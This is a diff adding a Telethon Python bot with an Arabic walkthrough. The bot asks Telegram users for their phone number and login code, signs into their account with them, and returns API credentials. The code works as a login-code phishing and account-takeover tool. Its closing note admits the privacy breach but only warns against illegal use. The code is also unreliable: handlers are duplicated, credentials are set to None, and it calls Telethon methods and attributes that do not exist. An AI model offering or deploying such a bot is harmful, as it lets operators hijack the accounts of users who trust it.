@@ -1,0 +1,125 @@
+```python
+from telethon import TelegramClient, events, Button
+import asyncio
+
+# إنشاء عميل تيلثون
+client = TelegramClient('my_bot', None, None)
+
+# تعريف الكيبورد مع خيارات الردود
+keyboard = [
+    [Button.inline("رقم هاتفي", data="phone_number"), Button.inline("رمز الدخول", data="auth_code")]
+]
+
+@client.on(events.NewMessage(pattern='/get_api'))
+async def get_api_handler(event):
+    await event.respond("أرسل لي رقم هاتفك.")
+
+@client.on(events.CallbackQuery())
+async def callback_handler(event):
+    data = event.data.decode()
+
+    if data == 'phone_number':
+        await event.edit("أرسل لي رقم هاتفك.")
+    elif data == 'auth_code':
+        await event.edit("أرسل لي رمز الدخول الذي تلقيت.")
+
+@client.on(events.NewMessage(pattern='/start'))
+async def start_handler(event):
+    await event.respond("مرحبا! 👋", buttons=keyboard)
+
+@client.on(events.NewMessage(pattern='/get_api'))
+async def get_api_handler(event):
+    await event.respond("أرسل لي رقم هاتفك.")
+
+    # انتظار الرسالة من المستخدم 
+    phone = await client.wait_for(events.NewMessage(from_users=event.sender_id))
+    phone_number = phone.message.text
+
+    #  ارسال رمز الدخول
+    await client.send_code_request(phone_number)
+    await event.respond("أرسل لي رمز الدخول الذي تلقيت.")
+
+    # انتظار رمز الدخول 
+    code = await client.wait_for(events.NewMessage(from_users=event.sender_id))
+    code_message = code.message.text
+
+    try:
+        #  تسجيل الدخول باستخدام رمز الدخول 
+        await client.sign_in(phone_number, code_message)
+        api_id = client.session.api_id
+        api_hash = client.session.api_hash
+
+        #  ارسال api_id + api_hash
+        await event.respond(f"API ID: `{api_id}`\nAPI Hash: `{api_hash}`")
+
+    except Exception as e:
+        await event.respond(f"حدث خطأ: {e}")
+
+async def main():
+    await client.start()
+    print("البوت جاهز للعمل")
+    await client.run_until_disconnected()
+
+if __name__ == '__main__':
+    asyncio.run(main())
+
+```
+
+**شرح الكود:**
+
+1. **استيراد المكتبات:** 
+   - `from telethon import TelegramClient, events, Button`:  يستورد مكتبة Telethon لإنشاء عميل للبوت ومعالجة الأحداث و إنشاء أزرار الكيبورد.
+2. **إنشاء عميل تيلثون:**
+   - `client = TelegramClient('my_bot', None, None)`:  يُنشئ عميلًا جديدًا للبوت باسم `my_bot`. يُلاحظ هنا أن `api_id` و `api_hash` يتم تعيينهما لـ `None` في البداية.
+
+3. **تعريف الكيبورد:**
+   - `keyboard = [ ... ]`:  يُنشئ قائمة من الأزرار، مع وضع زرين في الصف الأول.
+   - `data="phone_number"`:  يقوم بوضع بيانات فريدية لكل زر، تُستخدم في التعامل مع ردود المستخدم.
+
+4. **معالجة الأمر `/get_api`:**
+   - `@client.on(events.NewMessage(pattern='/get_api'))`:  هذا هو المُعالج الذي يتم تنفيذه عندما يُرسل المستخدم الأمر `/get_api`.
+   - `await event.respond("أرسل لي رقم هاتفك.")`:  يرسل ردًّا للمستخدم  يطلب منه إرسال رقم هاتفه.
+
+5. **معالجة النقرات على أزرار الكيبورد:**
+   - `@client.on(events.CallbackQuery())`:  هذا هو المُعالج الذي يتم تنفيذه عندما يُضغط المستخدم على زر من الكيبورد.
+   - `data = event.data.decode()`:  يحصل على البيانات الفريدة للزر الذي تم الضغط عليه.
+   - `if data == 'phone_number': ...`:  يُحدد ردود مختلفة بناءً على البيانات الفريدة لكل زر.
+
+6. **معالجة الأمر `/start`:**
+   - `@client.on(events.NewMessage(pattern='/start'))`:  هذا هو المُعالج الذي يتم تنفيذه عندما يُرسل المستخدم الأمر `/start`.
+   - `await event.respond("مرحبا! 👋", buttons=keyboard)`:  يرسل ردًّا للمستخدم  "مرحبا! 👋"  مع الكيبورد المحدد.
+
+7. **انتظار رقم الهاتف:**
+   - `phone = await client.wait_for(events.NewMessage(from_users=event.sender_id))`:  ينتظر رسالة من المستخدم. 
+   - `phone_number = phone.message.text`:  يحصل على رقم الهاتف من الرسالة.
+
+8. **ارسال رمز الدخول:**
+   - `await client.send_code_request(phone_number)`:  يُرسل طلبًا لـ Telegram للحصول على رمز الدخول.
+   - `await event.respond("أرسل لي رمز الدخول الذي تلقيت.")`:  يرسل ردًّا للمستخدم يطلب منه إرسال رمز الدخول.
+
+9. **انتظار رمز الدخول:**
+   - `code = await client.wait_for(events.NewMessage(from_users=event.sender_id))`:  ينتظر رسالة من المستخدم تحتوي على رمز الدخول.
+   - `code_message = code.message.text`:  يحصل على رمز الدخول من الرسالة.
+
+10. **تسجيل الدخول باستخدام رمز الدخول:**
+   - `try: ... except Exception as e: ...`:  يُحاول تسجيل الدخول باستخدام رمز الدخول.
+   - `await client.sign_in(phone_number, code_message)`:  يُحاول تسجيل الدخول.
+   - `api_id = client.session.api_id`:  يحصل على `api_id` من جلسة البوت.
+   - `api_hash = client.session.api_hash`:  يحصل على `api_hash` من جلسة البوت.
+
+11. **ارسال api_id + api_hash:**
+   - `await event.respond(f"API ID: `{api_id}`\nAPI Hash: `{api_hash}`")`:  يرسل ردًّا للمستخدم  مع عرض  `api_id` و `api_hash`.
+
+12. **معالجة الأخطاء:**
+   - `except Exception as e: await event.respond(f"حدث خطأ: {e}")`:  يُعالج أي أخطاء قد تحدث خلال تسجيل الدخول.
+
+13. **بدء تشغيل البوت:**
+   -  نفس مراحل تشغيل البوت  كما في المثال السابق.
+
+**ملاحظات:**
+
+- هذا الكود يُشكل اختراقًا بسيطًا لخصوصية المستخدم، لذا ينبغي عليك استخدامه بعناية فائقة ولا تستخدمه لأي غرض غير قانوني.
+- قد تُغير Telegram بعض جوانب واجهة برمجة التطبيقات (API)، مما قد يتسبب في عدم عمل هذا الكود بشكل صحيح.
+
+
+
